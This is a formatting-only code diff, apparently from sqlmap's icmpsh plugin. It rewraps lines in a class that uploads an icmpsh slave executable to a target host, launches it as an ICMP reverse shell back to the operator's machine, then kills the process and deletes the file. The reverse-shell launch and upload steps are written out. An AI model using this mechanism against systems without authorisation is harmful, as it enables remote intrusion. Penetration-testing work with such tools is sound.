@@ -22,6 +22,7 @@ from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.exception import SqlmapDataException
 
+
 class ICMPsh:
     """
     This class defines methods to call icmpsh for plugins.
@@ -32,7 +33,11 @@ class ICMPsh:
         self.rhostStr = None
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP() or conf.hostname
-        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))
+        self._icmpslave = normalizePath(
+            os.path.join(
+                paths.SQLMAP_EXTRAS_PATH,
+                "icmpsh",
+                "icmpsh.exe_"))
 
     def _selectRhost(self):
         address = None
@@ -66,7 +71,8 @@ class ICMPsh:
             except socket.error:
                 valid = False
             finally:
-                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None
+                valid = valid and re.search(
+                    r"\d+\.\d+\.\d+\.\d+", address) is not None
 
             if conf.batch and not address:
                 raise SqlmapDataException("local host address is missing")
@@ -92,7 +98,8 @@ class ICMPsh:
         infoMsg = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
-        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)
+        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (
+            self._icmpslaveRemote, self.lhostStr)
 
         self.execCmd(cmd, silent=True)
 
@@ -101,15 +108,25 @@ class ICMPsh:
         self._randStr = randomStr(lowercase=True)
         self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr
 
-        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
-        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
+        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath,
+                                           self._icmpslaveRemoteBase)
+        self._icmpslaveRemote = ntToPosixSlashes(
+            normalizePath(self._icmpslaveRemote))
 
         logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
 
         if web:
-            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
+            written = self.webUpload(
+                self._icmpslaveRemote,
+                os.path.split(
+                    self._icmpslaveRemote)[0],
+                filepath=self._icmpslave)
         else:
-            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)
+            written = self.writeFile(
+                self._icmpslave,
+                self._icmpslaveRemote,
+                "binary",
+                forceCheck=True)
 
         if written is not True:
             errMsg = "there has been a problem uploading icmpsh, it "
@@ -135,6 +152,9 @@ class ICMPsh:
         logger.debug(debugMsg)
 
         time.sleep(1)
-        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
+        self.execCmd(
+            "taskkill /F /IM %s" %
+            self._icmpslaveRemoteBase,
+            silent=True)
         time.sleep(1)
         self.delRemoteFile(self._icmpslaveRemote)
